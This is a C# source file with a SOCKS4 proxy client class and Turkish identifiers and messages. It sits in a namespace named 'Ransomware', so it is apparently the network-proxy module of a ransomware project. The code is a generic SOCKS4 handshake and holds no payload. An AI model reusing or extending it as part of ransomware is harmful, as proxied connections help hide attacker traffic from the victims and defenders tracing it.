using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace Ransomware.Webİşlev.SOCKS
{
    class SOCKS4 : ISOCKS
    {
        private readonly byte vn = 0x04;
        private readonly byte cd = 0x01;
        private readonly byte userid = 0x00;

        private string proxyIp
        {
            set; get;
        }

        private short proxyPort
        {
            set; get;
        }

        private Dictionary<byte, string> hatalar = new Dictionary<byte, string>();

        public SOCKS4(string proxyIp, short proxyPort)
        {
            this.proxyIp = proxyIp;
            this.proxyPort = proxyPort;

            hatalar.Add(91, "request rejected or failed");
            hatalar.Add(92, "request rejected becasue SOCKS server cannot connect to identd on the client");
            hatalar.Add(93, "request rejected because the client program and identd report different user - ids.");
        }

        public Socket SOCKSBaglan(string ip, short port)
        {
            Socket soket = null;

            try
            {
                soket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                byte[] buffer = new byte[4096];
                int uzunluk;

                byte ipUzunlugu = Convert.ToByte(ip.Length);
                byte[] ipBytes = IPAddress.Parse(ip).GetAddressBytes();
                byte[] portBigEndian = BigEndian(port);

                soket.SendTimeout = 25000;
                soket.ReceiveTimeout = 25000;

                soket.Connect(new IPEndPoint(IPAddress.Parse(proxyIp), proxyPort));

                soket.Send(new byte[] { vn, cd }.Concat(portBigEndian).Concat(ipBytes).Concat(new byte[] { userid }).ToArray());
                uzunluk = soket.Receive(buffer);

                if (buffer[1] != 90)
                {
                    Debug.WriteLine("Hata: Bir sorun oluştu: " + hatalar[buffer[1]]);
                    soket.Dispose();
                    throw new Exception();
                }
            }
            catch
            {
                soket.Dispose();
                Console.WriteLine("Disposed");
                throw new Exception();
            }

            return soket;
        }

        private byte[] BigEndian(short port)
        {
            byte[] bytes = new byte[2];
            bytes[0] = (byte)(port >> 8);
            bytes[1] = (byte)port;

            return bytes;
        }

    }
}
